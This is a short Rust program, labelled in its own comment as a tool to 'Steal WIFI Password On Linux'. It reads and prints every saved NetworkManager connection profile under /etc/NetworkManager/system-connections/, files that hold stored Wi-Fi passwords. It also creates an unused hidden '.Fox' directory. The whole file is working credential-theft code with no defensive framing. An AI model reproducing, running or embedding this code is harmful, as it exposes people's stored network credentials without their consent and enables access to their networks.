use std::fs;
use std::fs::File;
use std::io::prelude::*;

fn main() {
    let paths = fs::read_dir("/etc/NetworkManager/system-connections/").unwrap();
    fs::create_dir_all(".Fox").expect("Error! File Exist.\n");
    for index in paths {
        println!("{}", steal_wifi_pas(index.unwrap().path().display().to_string()));
    }
}

//Steal WIFI Password On Linux
fn steal_wifi_pas(source: String) -> String {
    let mut files = File::open(&source).expect("Error! No File.\n");
    let mut context: String = String::new();
    files.read_to_string(&mut context).expect("Error! Not readable.\n");
    return context;
}
